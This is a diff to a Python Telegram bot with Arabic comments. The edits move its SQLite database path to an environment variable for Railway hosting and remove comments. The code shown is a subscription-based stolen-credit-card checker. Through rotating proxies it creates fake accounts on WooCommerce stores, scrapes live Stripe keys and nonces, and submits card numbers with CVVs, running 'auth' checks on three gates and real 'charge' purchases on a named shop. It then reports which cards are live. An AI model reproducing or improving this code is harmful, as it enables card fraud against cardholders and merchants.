@@ -33,8 +33,15 @@ except Exception as e:
     print(f"❌ خطأ في التوكن: {e}")
     sys.exit(1)
 
-# ================= قاعدة البيانات =================
-DB_PATH = "bot_database.db"
+# ================= قاعدة البيانات (مع دعم Railway) =================
+# ✅ استخدام متغير بيئة للمسار (يدعم Railway Volume)
+DB_PATH = os.environ.get('DB_PATH', '/app/data/bot_database.db')
+
+# إنشاء مجلد البيانات تلقائياً إذا لم يكن موجوداً
+DB_DIR = os.path.dirname(DB_PATH)
+if not os.path.exists(DB_DIR):
+    os.makedirs(DB_DIR)
+    print(f"📁 تم إنشاء مجلد البيانات: {DB_DIR}")
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -62,6 +69,7 @@ def init_db():
     )''')
     conn.commit()
     conn.close()
+    print(f"✅ تم تهيئة قاعدة البيانات في: {DB_PATH}")
 
 init_db()
 
@@ -193,7 +201,7 @@ class ProxyPool:
                 'success': success, 'failure': fail, 'last_used': 0,
                 'status': status, 'request_timestamps': []
             }
-        logger.info(f"📁 تم تحميل {len(self.proxies)} بروكسي")
+        logger.info(f"📁 تم تحميل {len(self.proxies)} بروكسي من قاعدة البيانات")
 
     def add_proxy(self, proxy):
         with self.lock:
@@ -313,7 +321,7 @@ CHARGE_GATE = {
 
 # تخزين اختيارات المستخدم
 user_gate_choice = {}
-user_check_type = {}  # 'auth' أو 'charge'
+user_check_type = {}
 
 # ================= بيانات الفاتورة للـ Charge =================
 BILLING_INFO = {
@@ -361,14 +369,12 @@ def check_card_auth_single(card_str, site_url, proxy=None):
     try:
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
         
-        # 1. الحصول على nonce
         resp = session.get(f"{site_url}/my-account/", headers=headers, proxies=proxy_dict, timeout=15)
         reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
         if not reg_nonce:
             return "FAILED_NONCE"
         reg_nonce = reg_nonce.group(1)
 
-        # 2. تسجيل حساب
         email = f"{random.randint(100000,999999)}@temp.com"
         data = {
             'email': email, 'password': 'Pass123!',
@@ -377,7 +383,6 @@ def check_card_auth_single(card_str, site_url, proxy=None):
         }
         session.post(f"{site_url}/my-account/", data=data, headers=headers, proxies=proxy_dict, timeout=15)
 
-        # 3. استخراج مفاتيح Stripe
         resp = session.get(f"{site_url}/my-account/add-payment-method/", headers=headers, proxies=proxy_dict, timeout=15)
         pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', resp.text)
         nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', resp.text)
@@ -387,7 +392,6 @@ def check_card_auth_single(card_str, site_url, proxy=None):
         stripe_pk = pk_match.group(0)
         setup_nonce = nonce_match.group(1)
 
-        # 4. إرسال البطاقة لـ Stripe
         stripe_data = {
             'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
             'card[exp_month]': month, 'card[exp_year]': year[-2:],
@@ -400,7 +404,6 @@ def check_card_auth_single(card_str, site_url, proxy=None):
         if not pm_id:
             return "DECLINED"
 
-        # 5. تأكيد SetupIntent
         ajax_data = {
             'action': 'wc_stripe_create_and_confirm_setup_intent',
             'wc-stripe-payment-method': pm_id,
@@ -438,7 +441,6 @@ def check_card_auth_with_retry(card_str, site_url):
 
 # ================= فحص Auth متعدد البوابات =================
 def check_card_multi_auth(card_str):
-    """فحص البطاقة على البوابات الثلاث بالترتيب"""
     results = []
     gates_order = ['1', '2', '3']
     
@@ -448,11 +450,9 @@ def check_card_multi_auth(card_str):
         status = check_card_auth_with_retry(card_str, site_url)
         results.append({'gate': gate_name, 'status': status})
         
-        # إذا فشلت، توقف (لتوفير الوقت)
         if status == "DECLINED":
             break
     
-    # تحليل النتائج
     passed_count = sum(1 for r in results if r['status'] == "PASSED")
     otp_count = sum(1 for r in results if r['status'] == "OTP")
     
@@ -476,7 +476,6 @@ def check_card_multi_auth(card_str):
 
 # ================= فحص Charge =================
 def check_card_charge(card_str, proxy=None):
-    """فحص Charge على بوابة Hornbakers"""
     parts = card_str.split('|')
     if len(parts) != 4:
         return "INVALID_FORMAT", None
@@ -498,20 +497,16 @@ def check_card_charge(card_str, proxy=None):
         product_url = CHARGE_GATE['product_url']
         product_id = CHARGE_GATE['product_id']
         
-        # 1. إضافة المنتج للسلة
         files = {'quantity': (None, '1'), 'add-to-cart': (None, product_id)}
         resp = session.post(f"{site_url}{product_url}", files=files, headers=headers, proxies=proxy_dict, timeout=15)
         
-        # 2. الانتقال لصفحة Checkout
         resp = session.get(f"{site_url}/checkout/", headers=headers, proxies=proxy_dict, timeout=15)
         checkout_html = resp.text
         
-        # استخراج Stripe PK و Nonce
         pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', checkout_html)
         nonce_match = re.search(r'woocommerce-process-checkout-nonce["\s]+value=["\']([^"\']+)', checkout_html)
         
         if not pk_match or not nonce_match:
-            # محاولة استخراج من JavaScript
             pk_match = re.search(r'"key":"(pk_live_[^"]+)"', checkout_html)
             nonce_match = re.search(r'"nonce":"([^"]+)"', checkout_html)
         
@@ -521,7 +516,6 @@ def check_card_charge(card_str, proxy=None):
         stripe_pk = pk_match.group(0) if pk_match.group(0).startswith('pk_') else pk_match.group(1)
         checkout_nonce = nonce_match.group(1)
         
-        # 3. إرسال البطاقة لـ Stripe
         email = BILLING_INFO['email']() if callable(BILLING_INFO['email']) else BILLING_INFO['email']
         stripe_data = {
             'type': 'card',
@@ -559,7 +553,6 @@ def check_card_charge(card_str, proxy=None):
                 return "OTP", None
             return "DECLINED", None
         
-        # 4. إتمام عملية الدفع (Charge)
         checkout_data = {
             'billing_first_name': BILLING_INFO['first_name'],
             'billing_last_name': BILLING_INFO['last_name'],
@@ -623,7 +616,6 @@ def check_card_charge_with_retry(card_str):
 
 # ================= معالجة البطاقات =================
 def process_single_card_auth(card, idx, total, chat_id):
-    """معالجة بطاقة واحدة في فحص Auth المتعدد"""
     final_status, emoji, results = check_card_multi_auth(card)
     bin6 = card.split('|')[0][:6]
     bin_info = get_bin_info(bin6)
@@ -654,7 +646,6 @@ def process_single_card_auth(card, idx, total, chat_id):
     return final_status
 
 def process_single_card_charge(card, idx, total, chat_id):
-    """معالجة بطاقة واحدة في فحص Charge"""
     status, redirect = check_card_charge_with_retry(card)
     bin6 = card.split('|')[0][:6]
     bin_info = get_bin_info(bin6)
@@ -684,7 +675,6 @@ def process_single_card_charge(card, idx, total, chat_id):
     return status
 
 def check_cards(cards_text, chat_id, message_id, check_type):
-    """فحص مجموعة بطاقات"""
     cards = [c.strip() for c in cards_text.splitlines() if "|" in c and len(c.split('|')) == 4]
     if not cards:
         bot.edit_message_text("❌ لم يتم العثور على بطاقات صالحة. الصيغة: رقم|شهر|سنة|cvv", chat_id, message_id)
@@ -724,7 +714,6 @@ def check_cards(cards_text, chat_id, message_id, check_type):
             except:
                 declined += 1
     
-    # الملخص
     if check_type == 'auth':
         summary = f"""🏁 **ملخص فحص Multi-Auth**
 ✅ LIVE/SUPER: {passed}
@@ -779,7 +768,6 @@ def redeem(message):
 
 @bot.message_handler(commands=['check'])
 def check_command(message):
-    """اختيار نوع الفحص"""
     user_id = message.from_user.id
     if not is_subscription_active(user_id):
         bot.reply_to(message, "⛔ اشتراكك غير نشط. استخدم /redeem")
@@ -883,7 +871,6 @@ def handle_text(message):
     
     text = message.text.strip()
     
-    # إذا كان بروكسيات
     if ":" in text and "|" not in text and not text.startswith('/'):
         proxies = [p.strip() for p in text.splitlines() if p.strip() and ':' in p]
         if proxies:
@@ -891,7 +878,6 @@ def handle_text(message):
             bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
         else:
             bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
-    # إذا كان بطاقات
     elif "|" in text:
         check_type = user_check_type.get(user_id)
         if not check_type:
@@ -1042,5 +1028,6 @@ print("✅ البوت شغال مع:")
 print("  • فحص Auth متعدد البوابات (3 بوابات)")
 print("  • فحص Charge (1 بوابة)")
 print("  • نظام اشتراكات ولوحة إدارة")
+print(f"📁 قاعدة البيانات: {DB_PATH}")
 print("🔥 التوقيع: 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆")
 bot.infinity_polling()
